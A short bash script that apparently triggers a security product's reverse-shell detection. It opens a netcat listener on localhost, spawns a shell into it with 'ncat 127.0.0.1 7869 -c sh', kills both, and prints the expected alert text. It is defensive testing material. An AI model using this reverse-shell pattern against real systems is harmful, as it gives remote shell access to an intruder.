#!/bin/bash
echo -e "Conditions:\nLearning:OFF or CONTAINER MODEL ACTIVE\nTOGGLE:Reverse shell attacks\n....Triggering....\n"

nc -l -p 7869  &
sleep 1
ncat 127.0.0.1 7869 -c sh &
sleep 6
pkill -9 ncat
pkill -9 nc

echo -e "\nEvent information:\nCategory:Processes / Reverse Shell \nATT%CK technique:Native Binary Execution\nMessage:/usr/bin/dash is a reverse shell spawned by [ncat 127.0.0.1 7869 -c sh]. Full command: sh -c sh"
